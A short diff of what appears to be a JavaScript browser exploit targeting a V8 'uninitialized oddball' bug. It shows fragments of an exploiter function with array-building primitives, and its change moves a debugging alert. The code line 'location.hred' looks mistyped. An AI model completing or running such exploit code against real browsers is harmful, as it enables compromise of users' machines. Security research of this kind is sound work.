@@ -116,7 +116,7 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
 
     // Used to prevent optimizations
     let function_cache = {};
-
+    alert(typeof(uninitialized_oddball));
     function read_builder(size) {
         let arr = new Array(size);
         arr[0] = 1.1;
@@ -641,7 +641,7 @@ function main() {
     // %DebugPrint(glob_uninitialized_oddball);
     
     if(typeof(glob_uninitialized_oddball) != "undefined"){
-        alert(typeof(glob_uninitialized_oddball));
+        
         location.hred = "exp.html"
         window.location.reload();
     }
